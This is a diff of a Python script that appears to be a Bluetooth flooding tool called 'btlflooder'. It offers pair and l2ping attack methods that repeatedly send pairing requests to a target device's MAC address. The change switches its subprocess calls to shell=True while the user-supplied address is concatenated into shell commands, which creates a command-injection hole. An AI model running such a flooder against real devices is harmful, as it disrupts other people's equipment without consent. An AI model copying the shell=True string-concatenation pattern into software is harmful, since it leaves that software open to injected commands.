@@ -5,9 +5,13 @@ import subprocess
 import time
 import threading
 def run_cmd(command: str):
-        process = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         stdout, stderr = process.communicate()
         #return stdout.decode("utf-8")
+def run_cmd_out(command: str):
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        stdout, stderr = process.communicate()
+        return stdout.decode("utf-8")
 print("___.    __  .__      _____.__                    .___            \n\\_ |___/  |_|  |   _/ ____\\  |   ____   ____   __| _/___________ \n | __ \\   __\\  |   \\   __\\|  |  /  _ \\ /  _ \\ / __ |/ __ \\_  __ \\\n | \\_\\ \\  | |  |__  |  |  |  |_(  <_> |  <_> ) /_/ \\  ___/|  | \\/\n |___  /__| |____/  |__|  |____/\\____/ \\____/\\____ |\\___  >__|   \n     \\/                                           \\/    \\/       ")
 print("widow9098#0353")
 try: cmd = sys.argv[1]
@@ -19,7 +23,7 @@ elif (cmd == "off"):
     print("hci0 down")
     hwus = run_cmd("hciconfig hci0 down")
 elif (cmd == "scan"):
-    print(run_cmd("hcitool scan"))
+    print(run_cmd_out("hcitool scan"))
 elif (len(sys.argv) != 4):
     print("methods: pair/l2ping")
     print("utils: scan/on/off")
@@ -57,7 +61,7 @@ else:
                 run_cmd("bluetoothctl default-agent") 
                 run_cmd("timeout 1s bluetoothctl scan on")  
                 run_cmd("timeout 2s bluetoothctl pair " + macadd) 
-                run_cmd("clear")
+                os.system("clear")
                 print("sent pair packet to " + macadd)
                 print("sent " + str(packetsent) + " packets")
         print("running " + method + " attack on " + macadd)
